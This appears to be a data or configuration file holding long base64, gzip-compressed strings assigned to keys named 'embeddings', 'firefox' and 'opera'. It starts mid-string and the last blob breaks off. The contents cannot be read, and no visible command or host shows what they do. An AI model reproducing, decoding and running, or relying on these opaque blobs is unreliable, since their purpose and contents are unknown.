FbSNz6XVFUZNn/JsqGowiMpVUvXGtfXyMmuuv1dJqbsmWfFPwS7WkFx8BR4j7iY+BIEDt1hrAjFHDB0lxL5gkcdvJnIVgF5QCF7ElCZVtNxUNrtb7mfLqqy1Su7f55RXzPMg+nuc8kmyjAirro5HyUEA11gkPQm84qZN5eubkynpXhbvPk8Fi1wW08DJtEiKhhm5Y9SRB5FkcpXda4+zGk2313OOkqPojAdwl4gXKQtkNmw2GIy8kEW4raSSi/wC+8Omn5mYPRl6rvNAcfF7w6KjfXU9/6lmaQYxDq89aN7sx24muHYzr3h9sbc0rioBzslNhJfK+DI0azhP2m/8D6Jr3Agk5fMFXc57jeA2Kp8Y6O45GRLV3+jS1vzc7VCyQzrzxr4cqaYQxur1aC5OQhjXnkocnTjYkvkdCdQjiZ5BoH+ctZYA+3HFyImK4NB9bZrV7c01zB8c3+MdR8uY7UkMLqNBNmo2GORizPcerZ769qrcR4tTwfF5+jfUAgNTS2k+2Man+jlUQrJpi385m3XifHBt973gAqjrk24+grCIdArWtUt7HoaYTENiSZpcXTGNzo9YSAr6Rwu9quPfUXTNr8A+uM1/FFEwKVBKv1xQP15J1LMq3BZvaUS2rkEgnTUg1t7u3jNn94nT/4H0vx88fTrYfWKpE4blsUT9bssaEAWBldbfmEiTak8m5yhWXJ85/efPnX7/qdO3zG7s1Id03R4LFlKx2o+StYQuj7xySP+HPaf/7LnzeNf5/ns9Bm6loOfqeq6qVHZldy4CpMQHf4NHj/p7jx/NucxujEBzkIK6V9aAIKYbLfuQXEkeV5mqnnU8ExC5afiWRK3AFb7YWqhqNC+XajqvQUHtXX37ENCVNSD91t6RROiR6Kvd1gFTFoLRG6eJD4m636sIzdqtAbmc6YlAU/b5TRRw6rUQVPvrhOciKGjMqMn7jPELwSPZMla1G+MgnIO6/GtjXHYqCpUTWz+3/jQi/6/AAo+/wx/uFgtHrFYtPFiWWWi9+vX18eDt5ORwejE6O3irDsIMkrfHzBU84Qv59sBb6vAqSNQvzjaRrIUTVOpXyMpgCClKr177jlQdkMyfABvEzafl9UtnU9Idd7/Gwa4Jaa9ZBM3XaCZna1yOtDaoX2O62YS6Fp9qxrqXBQ2+6mhpdff1kxuruFG3bbaMuADbBSHZAtc/sPXvnm1bI6n9R8pc46ufyPwnjffTpzJVmS77UXJyDeIVvpUu1eELXEU+i+GRsmNcmqGuGUve/frKozPo4YPmg1glWp1LJgFATOyJAviE9Hd3NfX/ABDwK8NCPwAA"
    "embeddings" = "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"
    "firefox" = "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"
    "opera" = "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